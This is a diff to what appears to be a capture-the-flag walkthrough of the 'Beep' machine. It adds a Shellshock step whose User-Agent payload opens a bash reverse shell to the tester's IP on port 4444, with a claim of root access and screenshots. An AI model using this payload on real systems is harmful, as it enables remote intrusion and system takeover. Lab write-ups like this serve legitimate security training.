@@ -15,6 +15,11 @@ I am gonna apply shockshell vulnnerability in user agent and will get root privi
 
 ![Beep_login](https://user-images.githubusercontent.com/55708909/91586720-64ceb280-e973-11ea-9f74-20639f470ce8.png)
 
+As you can see we now have root priviledges by applying shell shock vuln in the user agent
+
+() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
+
+![Beep_shock](https://user-images.githubusercontent.com/55708909/91626607-316d4180-e9ce-11ea-945b-00265b917d9e.png)
 
 
 
